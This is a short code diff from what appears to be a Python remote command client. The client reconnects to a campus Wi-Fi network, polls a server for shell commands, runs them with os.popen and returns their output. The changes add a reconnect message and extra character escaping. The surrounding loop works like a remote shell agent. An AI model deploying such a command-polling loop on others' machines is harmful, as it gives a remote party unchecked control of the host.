@@ -182,6 +182,9 @@ while(True == True):
         time.sleep(3)
         internet = is_connected("www.google.com")
         os.system('netsh wlan connect name=SmartCampus>nul')
+        time.sleep(3)
+        if(is_connected("www.google.com")):
+            doPrint('Connection established')
     if not(check_session(session_id)):
         session_id = login()
     download_response = download("getinput?session_id="+session_id)
@@ -214,5 +217,5 @@ while(True == True):
                     else:
                         doPrint("("+response[0]['session_id']+") >> "+response[0]['input'].replace(';quote;', '"'))
                         output = os.popen(response[0]['input'].replace(';quote;', '"').replace(';and;', '&')).read()
-                        sendOutput(session_id, response[0]['session_id'], output.replace('"', ';quote;').replace('&', ';and;'), True)
+                        sendOutput(session_id, response[0]['session_id'], output.replace('"', ';quote;').replace('&', ';and;').replace('#', ';hashtag;'), True)
 terminate()
